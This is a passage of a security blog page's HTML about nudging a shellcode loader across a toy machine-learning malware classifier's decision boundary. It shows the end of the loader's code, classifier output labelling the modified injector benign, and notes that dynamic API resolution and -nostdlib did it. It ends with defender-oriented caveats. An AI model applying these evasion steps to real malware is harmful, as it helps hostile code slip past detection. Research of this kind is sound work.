</span></span><span class="highlight-line"><span class="highlight-line-content">	hThread  = pCreateThread(NULL, 0x0, (LPTHREAD_START_ROUTINE) pPayload, NULL, 0x0, NULL);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">	pWaitForSingleObject(hThread, INFINITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">	return 0;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">}</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">The above simple changes are enough to bump our injector across the decision boundary and get a classification of benign.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_2t8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">model&gt;python .\classify.py .\injector_1.exe<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">File: .\injector_1.exe<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Probability of malware: 0.4749<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">Classification: BENIGN</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">And if we now plot this point in our feature space, we can compare it to the original injector.</p><div class="mx-auto page-width-wide:mx-0 decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0 flex w-full justify-center"><div class="flex flex-row gap-3"><div class="relative overflow-hidden"><div class="relative overflow-hidden after:block after:absolute after:-inset-0 after:pointer-events-none w-fit"><img data-testid="zoom-image" alt="" style="max-width:100%;height:auto" loading="lazy" class="block" src="https://steve-s.gitbook.io/0xtriboulet/~gitbook/image?url=https%3A%2F%2F4223093509-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FsOcwlgEs4z7TZgzT3Eq0%252Fuploads%252FzQs62vaaBqa9FOefF9P3%252Funknown.png%3Falt%3Dmedia%26token%3D5bbdbf28-797f-47e7-aba5-9b52871b76bd&amp;width=768&amp;dpr=3&amp;quality=100&amp;sign=d93393d6&amp;sv=2" width="578" height="573"></div></div></div></div><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-center self-center justify-center"><i class="font-italic"><strong class="font-bold">Injector.exe and Injector_1.exe </strong></i><i class="font-italic">plotted into our feature space (rotated)</i></p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">In this case, with a very minimal amount of manipulations to the source code, we were able to achieve a benign classification of what is a functionally equivalent shellcode loader. This was possible because the dynamic resolution of APIs resulted in more strings being included in our binary, and the -<i class="font-italic">nostdlib </i>option removed a lot of excess components and reduced our size. This combination of changes primarily resulted in an increased <i class="font-italic">string density</i> which moved us to the right of the initial position of our binary, crossing the decision boundary and resulting in the benign classification that we were after.</p><h2 id="considerations" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine#considerations"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_778qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_778qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Considerations</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This was a minimal example about classifiers and how you can manipulate the final classification by changing the properties of your input binary. <a class="underline decoration-[max(0.07em,1px)] underline-offset-2 links-accent:underline-offset-4 links-default:decoration-primary/6 links-default:text-primary-subtle hover:links-default:text-primary-strong contrast-more:links-default:text-primary contrast-more:hover:links-default:text-primary-strong links-accent:decoration-primary-subtle hover:links-accent:decoration-[3px] hover:links-accent:[text-decoration-skip-ink:none] transition-all duration-100" data-state="closed" href="https://github.com/FutureComputing4AI/EMBER2024/tree/main">Modern examples<svg class="gb-icon ml-0.5 inline size-3 links-accent:text-tint-subtle"><title>arrow-up-right</title><defs><mask id="_R_4r98qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/arrow-up-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4r98qav5ukqiv5ubsnpfivb_)"></rect></svg></a> of classifiers operate on potentially thousands of features, and this non-linearity breaks down some of the intuition that we can achieve in low-dimensional examples like this one.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Another consideration is that the linear decision boundary makes conceptualizing and visualizing the evasion intuitive and easy; non-linear models, like trees and deep nets, behave differently and generally require more effort to manipulate.</p><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Additionally, production defenses rely on dynamic behavior, telemetry correlation, reputation, sandbox detonation, memory inspection, or telemetry from real executions. And those characteristics may themselves may be quantified into features and analyzed by distinct machine learning models. All of that was out of scope in this blog, but it’s something to keep in mind.</p><h2 id="conclusion" class="text-xl @xs:text-2xl @lg:text-3xl font-semibold heading flex items-baseline scroll-mt-(--content-scroll-margin) text-start self-start justify-start relative group/hash mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 column-first-of-type:pt-0 pt-[1em]"><div class="relative hash grid grid-area-1-1 h-[1em] border-0 opacity-0 site-background rounded group-hover/hash:opacity-[0] group-focus/hash:opacity-[0] md:group-hover/hash:opacity-[1] md:group-focus/hash:opacity-[1] -ml-6 pr-2 [.flip-heading-hash_&amp;]:order-last [.flip-heading-hash_&amp;]:ml-1 [.flip-heading-hash_&amp;]:pl-2"><a class="inline-flex h-full items-start leading-tight" aria-label="Direct link to heading" href="https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/evading-the-machine#conclusion"><svg class="gb-icon self-center transition-colors text-transparent group-hover/hash:text-tint-subtle contrast-more:group-hover/hash:text-tint-strong size-4"><title>hashtag</title><defs><mask id="_R_7f8qav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/hashtag.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_7f8qav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="flex-1 z-1 justify-self-start max-w-full break-words text-start self-start justify-start leading-tight">Conclusion</div></h2><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">This post demonstrates concepts using intentionally small and simplified datasets and a deliberately trivial feature set. The goal is to build intuition about classifier geometry and the kinds of manipulations an attacker might explore. The examples are <strong class="font-bold">not</strong> representative of modern production detection systems. By creating a tiny, transparent classifier and then nudging a functionally equivalent binary classifier across its decision boundary, we gain insight into feature brittleness, attacker cost, and the types of trade-offs defenders should consider. That intuition suggests practical next steps: evaluate models on richer, temporally split datasets, incorporate dynamic and telemetry signals, assess transferability to other classifiers, and strengthen features that are expensive for an attacker to manipulate.</p></div><div class="flex flex-col md:flex-row mt-6 gap-2 max-w-3xl page-width-wide:max-w-screen-2xl mx-auto text-tint"><a class="group text-sm p-2.5 flex gap-4 flex-1 flex-row-reverse items-center pl-4 border border-tint-subtle rounded-sm circular-corners:rounded-2xl straight-corners:rounded-none hover:border-primary text-pretty md:p-4 md:text-base" href="https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence"><span class="flex flex-col flex-1 text-right"><span class="text-xs">Previous</span><span class="text-tint-strong group-hover:text-primary line-clamp-2">Artificial Intelligence</span></span><svg class="gb-icon hidden size-4 text-tint-subtle contrast-more:text-tint-strong group-hover:text-primary md:block"><title>chevron-left</title><defs><mask id="_R_4qqav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-left.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_4qqav5ukqiv5ubsnpfivb_)"></rect></svg></a><a class="group text-sm p-2.5 flex gap-4 flex-1 flex-row items-center pr-4 border border-tint-subtle rounded-sm circular-corners:rounded-2xl straight-corners:rounded-none hover:border-primary text-pretty md:p-4 md:text-base" href="https://steve-s.gitbook.io/0xtriboulet/artificial-intelligence/hiding-in-the-trees"><span class="flex flex-col flex-1"><span class="text-xs">Next</span><span class="text-tint-strong group-hover:text-primary line-clamp-2">Hiding in the Trees</span></span><svg class="gb-icon hidden size-4 text-tint-subtle contrast-more:text-tint-strong group-hover:text-primary md:block"><title>chevron-right</title><defs><mask id="_R_5aqav5ukqiv5ubsnpfivb_" style="mask-type:alpha"><image data-testid="mask-image" href="https://ka-p.fontawesome.com/releases/v7.1.0/svgs/regular/chevron-right.svg?v=2&amp;token=a463935e93" width="100%" height="100%" preserveAspectRatio="xMidYMid meet"></image></mask></defs><rect width="100%" height="100%" fill="currentColor" mask="url(#_R_5aqav5ukqiv5ubsnpfivb_)"></rect></svg></a></div><div class="mx-auto mt-6 page-api-block:ml-0 flex max-w-3xl page-full-width:max-w-screen-2xl flex-row flex-wrap items-center gap-4 text-tint contrast-more:text-tint-strong"><p class="mr-auto text-sm ">Last updated <time data-visual-test="transparent" datetime="2026-01-02T21:10:55.233Z" data-state="closed">1 month ago</time></p></div></main></div></div><!--$--><!--/$--></div></div></body></html>